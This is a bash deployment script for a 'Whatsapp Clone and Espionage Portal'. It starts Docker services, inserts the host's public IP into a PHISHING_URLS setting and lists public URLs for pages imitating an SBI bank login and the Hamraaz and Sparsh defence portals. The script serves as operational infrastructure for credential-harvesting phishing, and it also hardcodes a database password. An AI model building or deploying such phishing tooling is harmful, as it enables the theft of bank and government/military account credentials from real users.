#!/bin/bash

# 🚀 Startup Script for Whatsapp Clone and Espionage Portal
# This script will:
# 1. Get the current public IP
# 2. Update env.example with the new IP
# 3. Create .env file from env.example
# 4. Start all services (MongoDB, Backend, Frontend, Espionage Portal)
# 5. Verify all services are running

set -e  # Exit on error

echo "🚀 Starting Whatsapp Clone and Espionage Portal Setup..."
echo "=================================================="

# Step 1: Get the current public IP
echo "📡 Getting current public IP address..."
PUBLIC_IP=$(curl -s ifconfig.io)

if [ -z "$PUBLIC_IP" ]; then
    echo "❌ Failed to get public IP address. Please check your internet connection."
    exit 1
fi

echo "✅ Public IP address: $PUBLIC_IP"

# Step 2: Update env.example with the new IP
echo "📝 Updating env.example with new IP address..."
ENV_EXAMPLE="/home/demon/Whiz/WhatsappClone-v1/env.example"

if [ ! -f "$ENV_EXAMPLE" ]; then
    echo "❌ env.example file not found at $ENV_EXAMPLE"
    exit 1
fi

# Replace the IP in PHISHING_URLS (assuming format: http://OLD_IP:8001/...)
# We'll replace any IP address in the PHISHING_URLS line with the new IP
# Note: Espionage runs on port 8001, so we'll use that port
# First, replace the IP address (keeping the port 8001)
sed -i "s|http://[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+:8001|http://${PUBLIC_IP}:8001|g" "$ENV_EXAMPLE"

# Update CLIENT_URL and CORS_ORIGIN for frontend on port 8080
sed -i "s|CLIENT_URL=http://localhost:3000|CLIENT_URL=http://localhost:8080|g" "$ENV_EXAMPLE"
sed -i "s|CORS_ORIGIN=http://localhost:3000|CORS_ORIGIN=http://localhost:8080|g" "$ENV_EXAMPLE"

# Update MONGODB_URI for docker environment
sed -i "s|MONGODB_URI=mongodb://localhost:27017/whatsapp-clone|MONGODB_URI=mongodb://whatsappuser:whatsappPass123@mongo:27017/whatsapp-clone?authSource=admin|g" "$ENV_EXAMPLE"

echo "✅ Updated env.example with IP: $PUBLIC_IP and ports"

# Step 3: Create .env file from env.example
echo "📋 Creating .env file from env.example..."
# Create .env in root directory (for docker-compose if it reads from there)
ENV_FILE_ROOT="/home/demon/Whiz/WhatsappClone-v1/.env"
cp "$ENV_EXAMPLE" "$ENV_FILE_ROOT"
# Also create .env in backend directory (where server.js expects it when running directly)
ENV_FILE_BACKEND="/home/demon/Whiz/WhatsappClone-v1/backend/.env"
cp "$ENV_EXAMPLE" "$ENV_FILE_BACKEND"
echo "✅ Created .env files in both root and backend directories"
cp "$ENV_EXAMPLE" "$ENV_FILE_BACKEND"
echo "✅ Created .env files in both root and backend directories"

# Step 4: Start all services
echo "🔨 Starting all services (MongoDB, Backend, Frontend, Espionage Portal)..."
cd /home/demon/Whiz/WhatsappClone-v1/

# Check if Docker is running
if ! docker info > /dev/null 2>&1; then
    echo "❌ Docker is not running. Please start Docker first."
    exit 1
fi

# Stop any existing containers
echo "🛑 Stopping any existing containers..."
docker-compose down 2>/dev/null || true

# Build and start the containers
echo "🔨 Building and starting all containers..."
docker-compose up --build -d

# Wait for containers to start
echo "⏳ Waiting for containers to start..."
sleep 30

# Verify all services are running
if docker-compose ps | grep -q "Up"; then
    echo "✅ All services are running"
else
    echo "❌ Some services failed to start. Check logs with: cd /home/demon/Whiz/WhatsappClone-v1/ && docker-compose logs"
    exit 1
fi

# Step 5: Verify services are working
echo ""
echo "🔍 Verifying services are working..."
echo "===================================="

# Check Espionage Portal
echo "Checking Espionage Portal..."
ESPIONAGE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8001/ || echo "000")
if [ "$ESPIONAGE_STATUS" = "200" ] || [ "$ESPIONAGE_STATUS" = "301" ] || [ "$ESPIONAGE_STATUS" = "302" ]; then
    echo "✅ Espionage Portal is responding (HTTP $ESPIONAGE_STATUS)"
else
    echo "⚠️  Espionage Portal check returned HTTP $ESPIONAGE_STATUS (may still be starting)"
fi

# Check Whatsapp Backend
echo "Checking Whatsapp Backend..."
WHATSAPP_BACKEND_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5000/api/health || echo "000")
if [ "$WHATSAPP_BACKEND_STATUS" = "200" ]; then
    echo "✅ Whatsapp Backend is responding (HTTP $WHATSAPP_BACKEND_STATUS)"
else
    echo "⚠️  Whatsapp Backend check returned HTTP $WHATSAPP_BACKEND_STATUS (may still be starting)"
fi

# Check Whatsapp Frontend
echo "Checking Whatsapp Frontend..."
WHATSAPP_FRONTEND_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ || echo "000")
if [ "$WHATSAPP_FRONTEND_STATUS" = "200" ] || [ "$WHATSAPP_FRONTEND_STATUS" = "301" ] || [ "$WHATSAPP_FRONTEND_STATUS" = "302" ]; then
    echo "✅ Whatsapp Frontend is responding (HTTP $WHATSAPP_FRONTEND_STATUS)"
else
    echo "⚠️  Whatsapp Frontend check returned HTTP $WHATSAPP_FRONTEND_STATUS (may still be starting)"
fi

# Summary
echo ""
echo "=================================================="
echo "🎉 Setup Complete!"
echo "=================================================="
echo ""
echo "🌐 Server URLs:"
echo "   Espionage Portal:  http://${PUBLIC_IP}:8001/"
echo "   Espionage Hamraaz: http://${PUBLIC_IP}:8001/hamraaz/"
echo "   Espionage SBI:     http://${PUBLIC_IP}:8001/sbi-login/"
echo "   Espionage Sparsh:  http://${PUBLIC_IP}:8001/sparsh/"
echo ""
echo "   Whatsapp Backend:  http://${PUBLIC_IP}:5000/api/health"
echo "   Whatsapp Frontend: http://${PUBLIC_IP}:8080/"
echo ""
echo "📋 Useful commands:"
echo "   View logs:   cd /home/demon/Whiz/WhatsappClone-v1/ && docker-compose logs -f"
echo "   Stop all:   cd /home/demon/Whiz/WhatsappClone-v1/ && docker-compose down"
echo ""
echo "✅ All services should be running now!"
echo ""

